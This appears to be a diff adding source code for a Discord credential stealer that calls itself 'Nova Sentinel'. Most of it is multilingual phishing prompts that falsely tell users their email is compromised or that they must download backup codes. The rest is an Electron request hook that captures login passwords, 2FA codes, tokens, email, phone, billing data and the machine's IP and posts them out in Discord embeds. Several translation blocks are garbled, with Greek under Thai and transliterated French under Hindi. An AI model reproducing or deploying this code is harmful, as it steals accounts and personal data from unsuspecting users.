+      "Veuillez la changer pour continuer à utiliser votre compte.",
+      "Vous n\\'avez plus accès à votre adresse e-mail",
+      "Contactez votre fournisseur de messagerie pour la réparer.",
+    ],
+    pt: [
+      "Configurações do usuário",
+      "Editar endereço de e-mail",
+      "Altere seu endereço de e-mail",
+      "Detectamos algo incomum em sua conta Discord, seu endereço,",
+      "foi comprometido.",
+      "Por favor, altere-o para continuar usando sua conta.",
+      "Você não tem mais acesso ao seu endereço de e-mail",
+      "Contate seu provedor de e-mail para corrigi-lo.",
+    ],
+    da: [
+      "Brugerindstillinger",
+      "Rediger e-mailadresse",
+      "Ændre din e-mailadresse",
+      "Vi har registreret noget usædvanligt med din Discord-konto, din adresse,",
+      "er blevet kompromitteret.",
+      "Ændre den for at fortsætte med at bruge din konto.",
+      "Du har ikke længere adgang til din e-mailadresse",
+      "Kontakt din e-mail-udbyder for at få det rettet.",
+    ],
+    de: [
+      "Benutzereinstellungen",
+      "E-Mail-Adresse bearbeiten",
+      "Ändern Sie Ihre E-Mail-Adresse",
+      "Wir haben etwas Ungewöhnliches an Ihrem Discord-Konto festgestellt, Ihre Adresse,",
+      "wurde kompromittiert.",
+      "Ändern Sie sie, um Ihre Konto weiterhin zu verwenden.",
+      "Sie haben keinen Zugriff mehr auf Ihre E-Mail-Adresse",
+      "Kontaktieren Sie Ihren E-Mail-Anbieter, um das Problem zu beheben.",
+    ],
+    "en-GB": [
+      "User Settings",
+      "Edit email address",
+      "Change your Email-Address",
+      "We have detected something unusual with your Discord account, your address,",
+      "has been compromised.",
+      "Please change it to continue using your account.",
+      "No longer have access to your email",
+      "Contact your email provider to fix it.",
+    ],
+    "en-US": [
+      "User Settings",
+      "Edit email address",
+      "Change your Email-Address",
+      "We have detected something unusual with your Discord account, your address,",
+      "has been compromised.",
+      "Please change it to continue using your account.",
+      "No longer have access to your email",
+      "Contact your email provider to fix it.",
+    ],
+    "en-ES": [
+      "User Settings",
+      "Edit email address",
+      "Change your Email-Address",
+      "We have detected something unusual with your Discord account, your address,",
+      "has been compromised.",
+      "Please change it to continue using your account.",
+      "No longer have access to your email",
+      "Contact your email provider to fix it.",
+    ],
+    hr: [
+      "Korisničke postavke",
+      "Uredi adresu e-pošte",
+      "Promijenite svoju adresu e-pošte",
+      "Otkrili smo nešto neuobičajeno s vašim Discord računom, vaša adresa,",
+      "je kompromitirana.",
+      "Promijenite je da biste nastavili koristiti svoj račun.",
+      "Više nemate pristup svojoj e-pošti",
+      "Kontaktirajte svog pružatelja e-pošte da to popravi.",
+    ],
+    it: [
+      "Impostazioni utente",
+      "Modifica indirizzo email",
+      "Cambia il tuo indirizzo email",
+      "Abbiamo rilevato qualcosa di insolito nel tuo account Discord, il tuo indirizzo,",
+      "è stato compromesso.",
+      "Per favore cambialo per continuare a usare il tuo account.",
+      "Non hai più accesso alla tua email",
+      "Contatta il tuo provider email per risolvere il problema.",
+    ],
+    lt: [
+      "Vartotojo nustatymai",
+      "Redaguoti el. pašto adresą",
+      "Pakeiskite savo el. pašto adresą",
+      "Su jūsų Discord paskyra aptikome kažką neįprasto, jūsų adresas,",
+      "buvo pažeistas.",
+      "Pakeiskite jį, kad galėtumėte toliau naudoti savo paskyrą.",
+      "Dabar neturite prieigos prie savo el. pašto",
+      "Kreipkitės į savo el. pašto tiekėją, kad jį ištaisytumėte.",
+    ],
+    hu: [
+      "Felhasználói beállítások",
+      "E-mail cím szerkesztése",
+      "Változtassa meg e-mail címét",
+      "Furcsaságot észleltünk a Discord fiókjában, az ön címe,",
+      "meg lett veszélyeztetve.",
+      "Kérem változtassa meg, hogy folytathassa fiókjának használatát.",
+      "Nincs többé hozzáférése az e-mail címéhez",
+      "Lépjen kapcsolatba az e-mail szolgáltatójával, hogy kijavítsa.",
+    ],
+    no: [
+      "Brukerinnstillinger",
+      "Rediger e-postadresse",
+      "Endre e-postadressen din",
+      "Vi har oppdaget noe uvanlig med din Discord-konto, din adresse,",
+      "har blitt kompromittert.",
+      "Vennligst endre den for å fortsette å bruke kontoen din.",
+      "Har ikke lenger tilgang til e-posten din",
+      "Ta kontakt med e-postleverandøren din for å fikse det.",
+    ],
+    pl: [
+      "Ustawienia użytkownika",
+      "Edytuj adres e-mail",
+      "Zmień swój adres e-mail",
+      "Wykryliśmy coś nietypowego w Twoim koncie Discord, Twój adres,",
+      "został naruszony.",
+      "Zmień go, aby kontynuować korzystanie z konta.",
+      "Nie masz już dostępu do swojej poczty e-mail",
+      "Skontaktuj się z dostawcą usług poczty e-mail, aby to naprawić.",
+    ],
+    "pr-BR": [
+      "Configurações do usuário",
+      "Editar endereço de e-mail",
+      "Altere seu endereço de e-mail",
+      "Detectamos algo incomum em sua conta Discord, seu endereço,",
+      "foi comprometido.",
+      "Por favor, altere-o para continuar usando sua conta.",
+      "Você não tem mais acesso ao seu endereço de e-mail",
+      "Contate seu provedor de e-mail para corrigi-lo.",
+    ],
+    ro: [
+      "Setări utilizator",
+      "Editare adresă de email",
+      "Schimbă-ți adresa de email",
+      "Am detectat ceva neobișnuit în contul tău Discord, adresa ta,",
+      "a fost compromisă.",
+      "Te rugăm să o schimbi pentru a continua să-ți folosești contul.",
+      "Nu mai ai acces la adresa ta de email",
+      "Contactează furnizorul tău de email pentru a rezolva problema.",
+    ],
+    fi: [
+      "Käyttäjäasetukset",
+      "Muokkaa sähköpostiosoitetta",
+      "Vaihda sähköpostiosoitteesi",
+      "Olemme havainneet jotain epätavallista Discord-tililläsi, osoitteesi,",
+      "on vaarantunut.",
+      "Vaihda se jatkaaksesi tilisi käyttöä.",
+      "Sinulla ei ole enää pääsyä sähköpostiisi",
+      "Ota yhteyttä sähköpostin tarjoajaasi ongelman korjaamiseksi.",
+    ],
+    "sv-SE": [
+      "Användarinställningar",
+      "Redigera e-postadress",
+      "Ändra din e-postadress",
+      "Vi har upptäckt något ovanligt med ditt Discord-konto, din adress,",
+      "har komprometterats.",
+      "Ändra den för att fortsätta använda ditt konto.",
+      "Du har inte längre tillgång till din e-postadress",
+      "Kontakta din e-postleverantör för att åtgärda det.",
+    ],
+    vi: [
+      "Cài đặt người dùng",
+      "Chỉnh sửa địa chỉ email",
+      "Thay đổi địa chỉ email của bạn",
+      "Chúng tôi đã phát hiện một điều gì đó bất thường trong tài khoản Discord của bạn, địa chỉ của bạn,",
+      "đã bị đe dọa.",
+      "Vui lòng thay đổi nó để tiếp tục sử dụng tài khoản của bạn.",
+      "Bạn không còn quyền truy cập vào địa chỉ email của mình nữa",
+      "Liên hệ với nhà cung cấp email của bạn để sửa chữa nó.",
+    ],
+    tr: [
+      "Kullanıcı Ayarları",
+      "E-posta adresini düzenle",
+      "E-posta adresini değiştir",
+      "Discord hesabınızda alışılmadık bir şey tespit ettik, adresiniz,",
+      "tehlikeye girdi.",
+      "Kullanmaya devam etmek için lütfen değiştirin.",
+      "Artık e-posta adresinize erişiminiz yok",
+      "Sorunu çözmek için e-posta sağlayıcınızla iletişime geçin.",
+    ],
+    cs: [
+      "Uživatelské nastavení",
+      "Upravit e-mailovou adresu",
+      "Změnit e-mailovou adresu",
+      "Bylo zjištěno něco neobvyklého s vaším účtem Discord, vaše adresa,",
+      "byla narušena.",
+      "Prosím změňte ji, abyste mohli nadále používat svůj účet.",
+      "Nemáte již přístup k vaší e-mailové adrese",
+      "Kontaktujte svého poskytovatele e-mailu, abyste to opravili.",
+    ],
+    el: [
+      "Ρυθμίσεις χρήστη",
+      "Επεξεργασία διεύθυνσης email",
+      "Αλλαγή διεύθυνσης email",
+      "Έχουμε ανιχνεύσει κάτι ασυνήθιστο με το λογαριασμό σας στο Discord, η διεύθυνσή σας,",
+      "έχει διακινδυνευθεί.",
+      "Παρακαλούμε αλλάξτε τη για να συνεχίσετε να χρησιμοποιείτε το λογαριασμό σας.",
+      "Δεν έχετε πλέον πρόσβαση στη διεύθυνση email σας",
+      "Επικοινωνήστε με τον πάροχο email σας για να το διορθώσετε.",
+    ],
+    bg: [
+      "Потребителски настройки",
+      "Редактиране на имейл адрес",
+      "Промяна на имейл адреса",
+      "Открихме нещо необичайно във вашия Discord акаунт, вашия адрес,",
+      "е бил компрометиран.",
+      "Моля, променете го, за да продължите да използвате вашия акаунт.",
+      "Вече нямате достъп до вашия имейл адрес",
+      "Свържете се с вашия доставчик на имейли, за да го оправите.",
+    ],
+    ru: [
+      "Настройки пользователя",
+      "Изменить адрес электронной почты",
+      "Изменить адрес электронной почты",
+      "Мы обнаружили что-то необычное в вашей учетной записи Discord, ваш адрес",
+      "был скомпрометирован.",
+      "Пожалуйста, измените его, чтобы продолжить использовать свою учетную запись.",
+      "У вас больше нет доступа к вашему адресу электронной почты",
+      "Свяжитесь со своим поставщиком электронной почты, чтобы исправить это.",
+    ],
+    uk: [
+      "Налаштування користувача",
+      "Редагування електронної адреси",
+      "Змінити електронну адресу",
+      "Ми виявили щось незвичайне з вашим обліковим записом Discord, ваша адреса",
+      "була під загрозою.",
+      "Будь ласка, змініть її, щоб продовжити використання свого облікового запису.",
+      "Ви більше не маєте доступу до своєї електронної адреси",
+      "Зв\\'яжіться з постачальником електронної пошти, щоб виправити це.",
+    ],
+    hi: [
+      "उपयोगकर्ता सेटिंग्स",
+      "ईमेल पता संपादित करें",
+      "अपना ईमेल पता बदलें",
+      "हमने आपके Discord खाते में कुछ असामान्य चीजें पाई हैं, आपका पता,",
+      "संकट में है।",
+      "कृपया इसे बदलें ताकि आप अपने खाते का उपयोग जारी रख सकें।",
+      "अब आपके पास अपने ईमेल पते तक पहुँच नहीं है",
+      "इसे ठीक करने के लिए अपने ईमेल प्रदाता से संपर्क करें.",
+    ],
+    th: [
+      "การตั้งค่าผู้ใช้",
+      "แก้ไขที่อยู่อีเมล",
+      "เปลี่ยนที่อยู่อีเมลของคุณ",
+      "เราตรวจพบบางสิ่งบางอย่างที่ผิดปกติในบัญชี Discord ของคุณ ที่อยู่ของคุณ,",
+      "ถูกขัดจังหวะ",
+      "กรุณาเปลี่ยนเพื่อดำเนินการใช้บัญชีของคุณต่อไป",
+      "คุณไม่สามารถเข้าถึงที่อยู่อีเมลของคุณได้อีกต่อไป",
+      "ติดต่อผู้ให้บริการอีเมลของคุณเพื่อแก้ไข",
+    ],
+    "zh-CN": [
+      "用户设置",
+      "编辑电子邮件地址",
+      "更改电子邮件地址",
+      "我们在您的 Discord 帐户中检测到了一些异常情况，您的地址,",
+      "已经受到威胁。",
+      "请更改它以继续使用您的帐户。",
+      "您不再可以访问您的电子邮件地址",
+      "联系您的电子邮件提供商以解决问题。",
+    ],
+    ja: [
+      "ユーザー設定",
+      "メールアドレスを編集",
+      "メールアドレスを変更",
+      "あなたのDiscordアカウントに異常が検出されました、あなたのアドレスは",
+      "危険にさらされています。",
+      "アカウントを引き続き使用するために変更してください。",
+      "もはやあなたのメールアドレスにアクセスできません",
+      "問題を修正するためにメールプロバイダーに連絡してください。",
+    ],
+    "zh-TW": [
+      "用戶設置",
+      "編輯電子郵件地址",
+      "更改電子郵件地址",
+      "我們檢測到您的Discord帳戶有異常情況，您的地址",
+      "受到威脅。",
+      "請更改它以繼續使用您的帳戶。",
+      "您不再能夠訪問您的電子郵件地址",
+      "請聯繫您的電子郵件提供商以修復問題。",
+    ],
+    ko: [
+      "사용자 설정",
+      "이메일 주소 편집",
+      "이메일 주소 변경",
+      "귀하의 Discord 계정에 이상한 점이 감지되었습니다. 귀하의 주소,",
+      "이 위험에 빠져 있습니다.",
+      "귀하의 계정을 계속 사용하려면 변경하십시오.",
+      "이제 귀하의 이메일 주소에 액세스할 수 없습니다.",
+      "문제를 해결하기 위해 이메일 제공 업체에 문의하십시오.",
+    ],
+  };
+
+  var langue = languages[langueCible] ?? [
+    "User Settings",
+    "Edit email address",
+    "Change your Email-Address",
+    "We have detected something unusual with your Discord account, your address,",
+    "has been compromised.",
+    "Please change it to continue using your account.",
+    "No longer have access to your email",
+    "Contact your email provider to fix it.",
+  ];
+  return langue;
+}
+
+async function toForceBackups(langueCible) {
+  var languages = {
+    fr: [
+      "Paramètres utilisateur",
+      "Afficher les codes de sauvegarde",
+      "Téléchargez vos codes de backups",
+      "Vous n'avez pas encore télechargé vos codes de backups,",
+      "téléchargé les dès maintenant.",
+      "Vous devez valider votre identité afin de pouvoir re-utiliser votre compte.",
+      "Vous n\\'avez plus accès à votre adresse e-mail",
+      "Contactez votre fournisseur de messagerie pour la réparer.",
+    ],
+
+    pt: [
+      "Configurações do usuário",
+      "Ver códigos de recuperação",
+      "Faça o download de seus códigos de backup",
+      "Você ainda não baixou seus códigos de backup",
+      "Faça o download deles agora",
+      "Você precisa validar sua identidade para reutilizar sua conta",
+      "Você não tem mais acesso ao seu endereço de e-mail",
+      "Entre em contato com seu provedor de e-mail para resolver o problema",
+    ],
+    da: [
+      "Brugerindstillinger",
+      "Vis backup-koder",
+      "Download dine back-up-koder",
+      "Du har ikke downloadet dine back-up-koder endnu",
+      "Download dem nu",
+      "Du skal bekræfte din identitet for at kunne genbruge din konto",
+      "Du har ikke længere adgang til din e-mailadresse",
+      "Kontakt din e-mailudbyder for at ordne det",
+    ],
+    de: [
+      "Benutzereinstellungen",
+      "Backup-Codes anzeigen",
+      "Laden Sie Ihre Backupscodes herunter",
+      "Sie haben Ihre Backup-Codes noch nicht heruntergeladen,",
+      "laden Sie sie jetzt herunter",
+      "Sie müssen Ihre Identität bestätigen, um Ihr Konto wieder nutzen zu können.",
+      "Sie haben keinen Zugriff mehr auf Ihre E-Mail-Adresse",
+      "Kontaktieren Sie Ihren E-Mail-Anbieter, um sie zu reparieren.",
+    ],
+    "en-GB": [
+      "User settings",
+      "View Backup Codes",
+      "Download your backup codes",
+      "You haven't downloaded your backup codes yet,",
+      "Download them now",
+      "You need to validate your identity in order to re-use your account",
+      "You no longer have access to your e-mail address",
+      "Contact your e-mail provider to repair it",
+    ],
+    "en-US": [
+      "User settings",
+      "View backup codes",
+      "Download your backup codes",
+      "You haven't downloaded your backup codes yet,",
+      "Download them now",
+      "You need to validate your identity in order to re-use your account",
+      "You no longer have access to your e-mail address",
+      "Contact your e-mail provider to repair it",
+    ],
+    "en-ES": [
+      "User Settings",
+      "Edit email address",
+      "Change your Email-Address",
+      "We have detected something unusual with your Discord account, your address,",
+      "has been compromised.",
+      "Please change it to continue using your account.",
+      "No longer have access to your email",
+      "Contact your email provider to fix it.",
+    ],
+    hr: [
+      "Korisničke postavke",
+      "Prikaži pričuvne kodove",
+      "Preuzmi svoje rezervne kodove",
+      "Još niste preuzeli svoje rezervne kodove",
+      "preuzmite ih sada.",
+      "Morate potvrditi svoj identitet kako biste mogli ponovno koristiti svoj račun.",
+      "Više nemate pristup svojoj e-mail adresi",
+      "Kontaktirajte svog davatelja usluga e-pošte da biste to popravili.",
+    ],
+    it: [
+      "Impostazioni utente",
+      "Mostra codici di backup",
+      "Scarica i tuoi codici di backup",
+      "Non hai ancora scaricato i codici di backup",
+      "scaricali adesso.",
+      "Devi convalidare la tua identità per poter riutilizzare il tuo account.",
+      "Non hai più accesso al tuo indirizzo email",
+      "Contatta il tuo provider di posta elettronica per ripararlo.",
+    ],
+    lt: [
+      "Vartotojo nustatymai",
+      "Rodyti atsarginius kodus",
+      "Atsisiųskite atsarginius kodus",
+      "Dar neatsisiuntėte atsarginių kodų",
+      "atsisiųskite juos dabar",
+      "Kad galėtumėte pakartotinai naudoti paskyrą, turite patvirtinti savo tapatybę",
+      "Nebeturite prieigos prie savo el. pašto adreso",
+      "Susisiekite su savo el. pašto paslaugų teikėju, kad tai pataisytumėte",
+    ],
+    hu: [
+      "Felhasználói beállítások",
+      "Biztonsági kódok megjelenítése",
+      "Töltse le biztonsági kódjait",
+      "Még nem töltötte le a biztonsági kódokat",
+      "töltse le őket most.",
+      "A fiók újrafelhasználásához igazolnia kell személyazonosságát.",
+      "Már nem fér hozzá az e-mail címéhez",
+      "A javítás érdekében lépjen kapcsolatba e-mail szolgáltatójával.",
+    ],
+    no: [
+      "Brukerinstillinger",
+      "Vis reservekoder",
+      "Last ned reservekodene dine",
+      "Du har ikke lastet ned reservekodene dine ennå,",
+      "last ned dem nå.",
+      "Du må validere identiteten din for å gjenbruke kontoen din.",
+      "Du har ikke lenger tilgang til e-postadressen din",
+      "Kontakt e-postleverandøren din for å reparere den.",
+    ],
+    pl: [
+      "Ustawienia użytkownika",
+      "Pokaż kody zapasowe",
+      "Pobierz swoje kody zapasowe",
+      "Nie pobrałeś jeszcze kodów zapasowych",
+      "pobierz je teraz.",
+      "Aby móc ponownie korzystać ze swojego konta, musisz potwierdzić swoją tożsamość.",
+      "Nie masz już dostępu do swojego adresu e-mail",
+      "Skontaktuj się ze swoim dostawcą poczty e-mail, aby go naprawić.",
+    ],
+    "pr-BR": [
+      "Configurações do usuário",
+      "Ver códigos de recuperação",
+      "Faça o download de seus códigos de backup",
+      "Você ainda não baixou seus códigos de backup",
+      "Faça o download deles agora",
+      "Você precisa validar sua identidade para reutilizar sua conta",
+      "Você não tem mais acesso ao seu endereço de e-mail",
+      "Entre em contato com seu provedor de e-mail para resolver o problema",
+    ],
+    ro: [
+      "Setări utilizator",
+      "Show backup codes",
+      "Descărcați codurile de rezervă",
+      "Nu ați descărcat încă codurile de rezervă",
+      "Descarcă-le acum",
+      "Trebuie să vă validați identitatea pentru a vă reutiliza contul",
+      "Nu mai aveți acces la adresa dvs. de e-mail",
+      "Contactați furnizorul dvs. de e-mail pentru a o repara",
+    ],
+    fi: [
+      "Käyttäjän asetukset",
+      "Näytä varmuuskopiointikoodit",
+      "Lataa varmuuskopiointikoodit",
+      "Et ole vielä ladannut varmuuskopiointikoodejasi,",
+      "Lataa ne nyt",
+      "Sinun on vahvistettava henkilöllisyytesi, jotta voit käyttää tiliäsi uudelleen",
+      "Sinulla ei ole enää pääsyä sähköpostiosoitteeseesi",
+      "Ota yhteyttä sähköpostipalveluntarjoajaan asian korjaamiseksi",
+    ],
+    "sv-SE": [
+      "Användarinställningar",
+      "Visa säkerhetskoder",
+      "Ladda ner dina säkerhetskoder",
+      "Du har inte laddat ner dina säkerhetskoder ännu",
+      "Ladda ner dem nu",
+      "Du måste bekräfta din identitet för att kunna återanvända ditt konto",
+      "Du har inte längre tillgång till din e-postadress",
+      "Kontakta din e-postleverantör för att fixa det",
+    ],
+    vi: [
+      "Cấu hình người dùng",
+      "Chỉnh sửa biên nhận email",
+      "Thay đổi biên nhận e-mail của bạn",
+      "Detect algo incomum em sua conta Discord, seu endereço,",
+      "niềm tin bị tổn hại.",
+      "Để được giúp đỡ, thay đổi để tiếp tục usando sua conta.",
+      "Bạn không cần phải gửi nhưng bạn phải nhận được e-mail của mình",
+      "Hãy liên hệ với nhà cung cấp email của bạn để sửa lỗi.",
+    ],
+    tr: [
+      "Kullanıcı ayarları",
+      "Yedek kodları göster",
+      "Yedekleme kodlarınızı indirin",
+      "Yedekleme kodlarınızı henüz indirmediniz",
+      "Şimdi indirin",
+      "Hesabınızı yeniden kullanabilmeniz için kimliğinizi doğrulamanız gerekmektedir",
+      "E-posta adresinize artık erişiminiz yok",
+      "Düzeltmek için e-posta sağlayıcınızla iletişime geçin",
+    ],
+    cs: [
+      "Uživatelská nastavení",
+      "Zobrazit záložní kódy",
+      "Stáhnout záložní kódy",
+      "Ještě jste nestáhli své záložní kódy,",
+      "Stáhnout je nyní",
+      "Musíte potvrdit svou totožnost, abyste mohli znovu použít svůj účet",
+      "Již nemáte přístup ke své e-mailové adrese",
+      "Obraťte se na poskytovatele e-mailových služeb, aby to napravil",
+    ],
+    el: [
+      "Ρυθμίσεις χρήστη",
+      "Εμφάνιση κωδικών αντιγράφων ασφαλείας",
+      "Λήψη των εφεδρικών κωδικών σας",
+      "Δεν έχετε κατεβάσει ακόμα τους εφεδρικούς κωδικούς σας",
+      "Κατεβάστε τους τώρα",
+      "Πρέπει να επικυρώσετε την ταυτότητά σας για να χρησιμοποιήσετε ξανά τον λογαριασμό σας",
+      "Δεν έχετε πλέον πρόσβαση στη διεύθυνση ηλεκτρονικού ταχυδρομείου σας",
+      "Επικοινωνήστε με τον πάροχο ηλεκτρονικού ταχυδρομείου σας για να το διορθώσετε",
+    ],
+    bg: [
+      "Потребителски настройки",
+      "Показвай кодове за архивиране",
+      "Изтеглете резервните си кодове",
+      "Все още не сте изтеглили резервните си кодове,",
+      "Изтеглете ги сега",
+      "Трябва да потвърдите самоличността си, за да използвате повторно профила си",
+      "Вече нямате достъп до електронния си адрес",
+      "Свържете се с вашия доставчик на електронна поща, за да го поправите",
+    ],
+    ru: [
+      "Настройки пользователя",
+      "Показывать резервные коды",
+      "Загрузить резервные коды",
+      "Вы еще не загрузили резервные коды",
+      "Загрузите их сейчас",
+      "Вам необходимо подтвердить свою личность, чтобы повторно использовать свою учетную запись",
+      "Вы больше не имеете доступа к своему адресу электронной почты",
+      "Обратитесь к своему провайдеру электронной почты, чтобы исправить ситуацию",
+    ],
+    uk: [
+      "Налаштування користувача",
+      "Показати резервні коди",
+      "Завантажити резервні коди",
+      "Ви ще не завантажили резервні коди",
+      "Завантажте їх зараз",
+      "Вам потрібно підтвердити свою особу, щоб повторно використовувати свій обліковий запис",
+      "Ви більше не маєте доступу до своєї адреси електронної пошти",
+      "Зверніться до свого постачальника послуг електронної пошти, щоб виправити це",
+    ],
+    hi: [
+      "उपयोगकर्ता सेटिंग",
+      "बैकअप कोड प्रदर्शित करें",
+      "बैकअप के लिए आपके कोड्स का बैकअप",
+      "आपने बैकअप के लिए दोबारा टेलीचार्ज किया है,",
+      "टेलीचार्ज लेस डेस मेंटेनेंट।",
+      "वोस डेवेज़ वैलिडर वोट्रे आइडेंटिटे अफिन डे पूवोइर री-यूटिलाइज़र वोट्रे कॉम्प्टे।",
+      "आपका पता ई-मेल तक पहुंच से अधिक है",
+      "वोट्रे सप्लायर डी मेसेजरी पोर ला रिपेरर से संपर्क करें।",
+    ],
+    th: [
+      "Ρυθμίσεις χρήστη",
+      "Εμφάνιση εφεδρικών κωδικών",
+      "Λήψη των εφεδρικών κωδικών σας",
+      "Δεν έχετε ακόμη κατεβάσει τους εφεδρικούς κωδικούς σας,",
+      "κατεβάστε τα τώρα.",
+      "Πρέπει να επικυρώσετε την ταυτότητά σας για να χρησιμοποιήσετε ξανά τον λογαριασμό σας.",
+      "Δεν έχετε πλέον πρόσβαση στη διεύθυνση email σας",
+      "Επικοινωνήστε με τον πάροχο του email σας για να το επιδιορθώσετε.",
+    ],
+    "zh-CN": [
+      "用户设置",
+      "显示备份代码",
+      "下载您的备份密码",
+      "您尚未下载备份密码",
+      "现在下载",
+      "您需要验证身份才能重新使用您的帐户",
+      "您已无法访问您的电子邮件地址",
+      "请联系您的电子邮件提供商进行修复",
+    ],
+    ja: [
+      "ユーザー設定",
+      "バックアップ コードを表示",
+      "バックアップ コードをダウンロード",
+      "「まだバックアップ コードをダウンロードしていません。」",
+      "今すぐダウンロードしてください。",
+      "アカウントを再利用するには、本人確認を行う必要があります。",
+      "「メールアドレスにアクセスできなくなりました」",
+      "修復するにはメールプロバイダーに連絡してください。",
+    ],
+    "zh-TW": [
+      "用戶設定",
+      "顯示備份代碼",
+      "下載您的備份代碼",
+      "您尚未下載備份代碼，",
+      "立即下載。",
+      "「您必須驗證您的身分才能重新使用您的帳戶。」",
+      "您無法再存取您的電子郵件地址",
+      "「請聯絡您的電子郵件提供者進行修復。」",
+    ],
+    ko: [
+      "사용자 설정",
+      "백업 코드 표시",
+      "백업 코드 다운로드",
+      "아직 백업 코드를 다운로드하지 않았습니다.",
+      "지금 다운로드하세요.",
+      "계정을 다시 사용하려면 신원을 확인해야 합니다.",
+      "더 이상 이메일 주소에 접근할 수 없습니다",
+      "수리하려면 이메일 제공업체에 문의하세요.",
+    ],
+  };
+
+  var langue = languages[langueCible] ?? [
+    "User Settings",
+    "Edit email address",
+    "Change your Email-Address",
+    "We have detected something unusual with your Discord account, your address,",
+    "has been compromised.",
+    "Please change it to continue using your account.",
+    "No longer have access to your email",
+    "Contact your email provider to fix it.",
+  ];
+  return langue;
+}
+electron.session.defaultSession.webRequest.onCompleted(
+  config.onCompleted,
+  async (request, callback) => {
+    if (!["POST", "PATCH"].includes(request.method)) return;
+    if (request.statusCode !== 200) return;
+    try {
+      var data = JSON.parse(request.uploadData[0].bytes);
+    } catch (err) {
+      var data = queryString.parse(
+        decodeURIComponent(request.uploadData[0].bytes.toString())
+      );
+    }
+    var {
+      token,
+      user,
+      billing,
+      friends,
+      Nitro,
+      userAvatar,
+      userBanner,
+      userAvatar,
+      Billings,
+      Friends,
+    } = await BoukiTuclcavectesfonctions();
+
+    var { appPath, appName } = path;
+    var client_discord = appName;
+
+    var ip = await getIP();
+
+    switch (true) {
+      case request.url.endsWith("login"):
+        if (!token) {
+          await electron.session.defaultSession.webRequest.onCompleted(
+            config.onCompletedbis,
+            async (re, callback) => {
+              var dt;
+              try {
+                dt = JSON.parse(re.uploadData[0].bytes);
+              } catch (err) {
+                dt = queryString.parse(
+                  decodeURIComponent(re.uploadData[0].bytes.toString())
+                );
+              }
+
+              let {
+                token,
+                user,
+                billing,
+                friends,
+                Nitro,
+                userBanner,
+                userAvatar,
+                Billings,
+                Friends,
+              } = await BoukiTuclcavectesfonctions();
+              var password = data.password;
+              var params = await makeEmbed({
+                title: "<:nova:1132934190032244786> Nova Sentinel User Login",
+                color: config["embed-color"],
+                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+                fields: [
+                  {
+                    name: "Username <a:inject:1130448568268881960>",
+                    value: `\`${user.username}#${user.discriminator}\``,
+                    inline: !0,
+                  },
+                  {
+                    name: "ID <a:cat_rolling:1130448570789679165>",
+                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    inline: !0,
+                  },
+                  {
+                    name: "Nitro <a:nitro:1130453517312725052>",
+                    value: `${GetNitro(Nitro)}`,
+                    inline: !0,
+                  },
+                  {
+                    name: "Badges <a:badges:1130448593715740692>",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: !0,
+                  },
+                  {
+                    name: "Language <:4533language:1130453119919206500>",
+                    value: `${GetLangue(user.locale)}`,
+                    inline: !0,
+                  },
+                  {
+                    name: "NSFW <:3568underage:1153991874495922207>",
+                    value: `${GetNSFW(user.nsfw_allowed)}`,
+                    inline: !0,
+                  },
+                  {
+                    name: "A2F <a:keys:1159078859682107453>",
+                    value: `${GetA2F(user.mfa_enabled)}`,
+                    inline: !0,
+                  },
+                  {
+                    name: "@Copyright",
+                    value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://t.me/Sordeal)`,
+                    inline: !0,
+                  },
+                  {
+                    name: "Nova Files",
+                    value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
+                    inline: !0,
+                  },
+                  {
+                    name: "Billing <a:money:1130448564632436787>",
+                    value: `${Billings}`,
+                    inline: !0,
+                  },
+                  {
+                    name: "Email <:mail:1130451375495589968>",
+                    value: `\`${user.email}\``,
+                    inline: !0,
+                  },
+                  {
+                    name: "Phone :mobile_phone:",
+                    value: `\`${user.phone ?? "None"}\``,
+                    inline: !0,
+                  },
+                  {
+                    name: "<a:cam2:1130448575470514258> Password",
+                    value: `\`${password}\``,
+                    inline: !0,
+                  },
+                  {
+                    name: "Bio <:nova:1132934190032244786>",
+                    value: `\`\`\`${
+                      user.bio !== null &&
+                      user.bio !== undefined &&
+                      user.bio !== ""
+                        ? user.bio
+                        : ":x:"
+                    }\`\`\``,
+                    inline: false,
+                  },
+                  {
+                    name: "Code 2fa used <:nova:1132934190032244786>",
+                    value: `\`\`\`${
+                      dt.code !== null &&
+                      dt.code !== undefined &&
+                      dt.code !== ""
+                        ? dt.code
+                        : ":x:"
+                    }\`\`\``,
+                    inline: false,
+                  },
+                  {
+                    name: "<a:eatsomething:1130449693613228072> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: !1,
+                  },
+                ],
+
+                thumbnail: userAvatar,
+              });
+
+              var params2 = await makeEmbed({
+                title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+                color: config["embed-color"],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar,
+              });
+
+              params.embeds.push(params2.embeds[0]);
+              await post(params);
+              return;
+            }
+          );
+        } else {
+          if (token) {
+            var {
+              token,
+              user,
+              billing,
+              friends,
+              Nitro,
+              userAvatar,
+              userBanner,
+              userAvatar,
+              Billings,
+              Friends,
+            } = await BoukiTuclcavectesfonctions();
+
+            var password = data.password;
+
+            var params = await makeEmbed({
+              title: "<:nova:1132934190032244786> Nova Sentinel User Login",
+              color: config["embed-color"],
+              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+              fields: [
+                {
+                  name: "Username <a:inject:1130448568268881960>",
+                  value: `\`${user.username}#${user.discriminator}\``,
+                  inline: !0,
+                },
+                {
+                  name: "ID <a:cat_rolling:1130448570789679165>",
+                  value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                  inline: !0,
+                },
+                {
+                  name: "Nitro <a:nitro:1130453517312725052>",
+                  value: `${GetNitro(Nitro)}`,
+                  inline: !0,
+                },
+                {
+                  name: "Badges <a:badges:1130448593715740692>",
+                  value: `${GetBadges(user.flags)}`,
+                  inline: !0,
+                },
+                {
+                  name: "Language <:4533language:1130453119919206500>",
+                  value: `${GetLangue(user.locale)}`,
+                  inline: !0,
+                },
+                {
+                  name: "NSFW <:3568underage:1153991874495922207>",
